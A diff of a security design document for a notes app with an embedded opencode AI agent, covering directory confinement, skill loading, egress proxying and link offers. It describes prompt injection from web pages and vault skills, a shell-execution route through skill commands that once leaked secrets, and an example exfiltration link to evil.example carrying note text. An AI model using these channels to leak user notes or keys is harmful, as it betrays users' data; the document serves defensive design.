@@ -1,7 +1,7 @@
 ---
 title: "Security: karpathy.app"
 created: 2026-10-01
-edited: 2026-10-05
+edited: 2026-10-06
 ---
 
 # Security: karpathy.app
@@ -87,14 +87,30 @@ bearer token.
 - **Directory confinement:** the opencode image has no git, so opencode treats the session directory (the vault root)
   as the boundary; `external_directory: deny` blocks everything outside it. The check is lexical, so a symlink would
   escape it; hence `core.symlinks=false` on every clone. Instruction and skill lookup walks up past the vault root to
-  `/`, so `/vaults` and `/` must never contain `AGENTS.md`, `CLAUDE.md` or `.claude/`.
-- **No `OPENCODE_DISABLE_*` flags:** `OPENCODE_DISABLE_CLAUDE_CODE_*` would also drop the vault's own `CLAUDE.md` and
-  `.claude/skills`, and `OPENCODE_DISABLE_PROJECT_CONFIG` the vault's `AGENTS.md`/`CLAUDE.md`. The empty `HOME` keeps
-  global Claude files out instead.
-- **The only custom tool, `open_note`, comes from the image**, never from a vault: it sits in a root-owned, read-only
-  global config dir (`XDG_CONFIG_HOME=/opt/opencode-config`), pre-populated at build so opencode installs nothing at
-  runtime. It checks the path lexically and by `stat` inside the session directory, refuses dot-segments, reads no
-  content and changes nothing, so it is also allowed for `vault-readonly`. opencode *would* load tools from a vault's
+  `/`, so `/vaults` and `/` must never contain `AGENTS.md`, `CLAUDE.md`, `.claude/` or `.agents/` (the backend also relies
+  on `/vaults` holding no vault skills, to tell app skills from vault skills).
+- **One `OPENCODE_DISABLE_*` flag, `OPENCODE_DISABLE_CLAUDE_CODE_SKILLS=1` (image env), and no other.** It drops only
+  `.claude/skills/`, so a vault's skills come from `.agents/skills/` alone, for the palette and the AI's `skill` tool alike,
+  while `CLAUDE.md` and `AGENTS.md` keep loading (verified in the pinned binary; a test pins it against upgrades). The broad
+  `OPENCODE_DISABLE_CLAUDE_CODE` and `_PROMPT` would also drop the vault's `CLAUDE.md`, and
+  `OPENCODE_DISABLE_PROJECT_CONFIG` the vault's `AGENTS.md`/`CLAUDE.md`. The empty `HOME` keeps global Claude files out instead.
+  An opencode upgrade has to re-check this like the other confinement rules.
+- **Commands never use opencode's command endpoint** (`POST /session/:id/command`,
+  [ADR 0004](../../docs/adr/0004-commands-as-prompts-not-command-endpoint.md)). It replaces every `` !`cmd` `` in a skill
+  with the output of `cmd`, run through a shell with no permission check (`bash: deny` doesn't apply; a probe leaked the
+  user id and the model env), so any vault author could read `/run/secrets/…` or the provider keys with a `SKILL.md`. It also
+  resolves `@file` references and can't carry the per-turn `tools` map. A command turn goes through the normal prompt path
+  as plain text (`parseCommand`/`expandCommand`; a test pins that `` !`id -u` `` stays literal), so every guard applies. A
+  skill is instructions, not code. The skill's URLs count as user text for the known-URL rule: a skill is vault content,
+  as trusted as a note the AI reads, whose URLs are known too.
+- **App skills come only from the image** (`/opt/opencode-config/opencode/skills/`, read-only, root-owned like the tools),
+  never from a vault. A vault skill of the same name only replaces it in that vault; the backend decides the clash, and the
+  AI's `skill` tool may still load either.
+- **The custom tools, `open_note` and `open_url`, come from the image**, never from a vault: they sit in a root-owned,
+  read-only global config dir (`XDG_CONFIG_HOME=/opt/opencode-config`), pre-populated at build so opencode installs nothing at
+  runtime. `open_note` checks the path lexically and by `stat` inside the session directory, refuses dot-segments, reads no
+  content and changes nothing. `open_url` fetches nothing and returns `offered <url>` for an http(s) URL (see
+  [Web access](#web-access)). Both are allowed for `vault-readonly` too. opencode *would* load tools from a vault's
   `.opencode/tools/`; the harness-config rule below is what stops that.
 - **Harness config in a vault** (`.opencode/`, `opencode.json(c)`) disables chat for that vault and can't be created
   through the file API. It is code (plugins, custom tools, MCP servers with a `command`), and the managed config can
@@ -115,10 +131,30 @@ permission and it replaces earlier rules. Off = the model sees neither tool. `co
 | Data in a **search query** | Every query is a chip; the switch turns web access off | Exa receives the query text; the user sees it afterwards, not before. |
 | **SSRF / escape** (opencode API, backend, metadata, tailnet) | **Egress proxy** (Squid, `deploy/egress`): opencode is only on the `internal: true` network and reaches the internet through `HTTP(S)_PROXY`; the proxy refuses loopback, RFC 1918, link-local, CGNAT/tailnet, ULA and other special ranges after DNS resolution, on every request (so every redirect hop). | None known; the network tests check each target. |
 | **Loopback** (`NO_PROXY` names it, because opencode's plugin client must reach its own server directly) | **opencode server password:** HTTP Basic on every opencode route, health included. The backend sends it; the AI can't read it (`bash`, `external_directory` and `*.env` denied). | — |
-| **Untrusted web content** (pages up to 5 MB, images, results) | None at fetch time | An injected instruction can make the AI edit notes; the diff review before commit is the safety net (ADR 0001). |
+| Vault data leaves through a **link offer** (`open_url`) | The same known-URL check as `webfetch` (`guardWebCall`, one function for both, unit-tested), http(s) only, no cap, and the user's tap on a chip that shows the host. Nothing is fetched by the server, so it works with Web access off, and no tab opens by itself (browsers block that without a tap). | The AI can offer an attacker URL that is already in a note or page, but without added data. |
+| **Research** spends before the user agreed, or runs away | Skill instruction only: the plan turn scouts ≤ 3 searches / ≤ 2 fetches and stops; no backend rule (a `/research` turn has the tools of every turn). The 20 / 20 caps bound every turn, the skill aims at 8 sources per run turn, and the next block needs the user's reply. | A model that ignores the skill can run a full 20 / 20 block in the plan turn. No money or token cap. |
+| **Untrusted web content** (pages up to 5 MB, images, results) | None at fetch time | An injected instruction can make the AI edit notes, and content it saves lands in `Sources/` and `Wiki/`; the diff review before commit is the safety net (ADR 0001). |
+
+Within it, `webfetch` and `open_url` need a known URL, and only `webfetch` and `websearch` are capped.
 
 Not taken: an approval prompt per call (needs `ask`, which blocks the turn), a domain allowlist (defeats reading what
 the user points to), provider server tools (tied to one model vendor, ADR 0002).
+
+## The agents move
+
+The app writes vault files without a tap (`agents-standard.ts`), so it is fenced in:
+
+- It runs only after a clone, pull or open, under the exclusive vault lock (no turn runs), never while the vault is in
+  conflict, and never over an existing name (`AGENTS.md`, a skill folder: the clash stays and is listed).
+- `@path` imports are pasted into `AGENTS.md` only for an existing file inside the vault root that is not gitignored (the
+  paths go through the symlink-safe resolver; `AGENTS.md` is committed, so an ignored file's content would reach the
+  remote). Anything else stays as text.
+- The result is uncommitted changes, announced by a notice and reviewed before commit (ADR 0001); discarding undoes it.
+- **The skill link under `core.symlinks=false`:** the server never holds a real symlink: `.claude/skills` is a plain stub
+  file with the target (`../.agents/skills`, no trailing newline), and `Repo.stageSymlink` stages it with mode 120000 through
+  `git update-index --cacheinfo`. The commit's `git add -A` keeps that mode, so the commit carries a symlink that points inside
+  the repo; the Mac follows it, the server never does, and `paths.ts` still refuses real symlinks. Staging it is the only
+  index write outside a commit and commits nothing.
 
 ## Input handling
 
@@ -194,6 +230,9 @@ prod proxy adds a strict **CSP** (`default-src 'self'`, `script-src 'self'`, `ob
   (found in the attachments review, not fixed).
 - When `Sources` is a symlink, a chat upload with `source=new` creates an empty `upload-…` folder at the link's target
   before the symlink-safe resolver refuses the file itself (found in the attachments review, not fixed).
+- Links in the AI's reply text aren't checked: it can write `[text](https://evil.example/?d=<note text>)` and a tap sends the
+  data. This channel predates `open_url`, which doesn't widen it. A follow-up could render reply links whose URL isn't known as
+  plain text or with a warning.
 - The Beszel agent mounts the Docker socket (root-equivalent on the host; accepted).
 - Gatus has no authentication on the tailnet; secrets appear briefly in process lists during a deployment.
 - The GoDaddy API key can change every domain of the account and sits on the server.
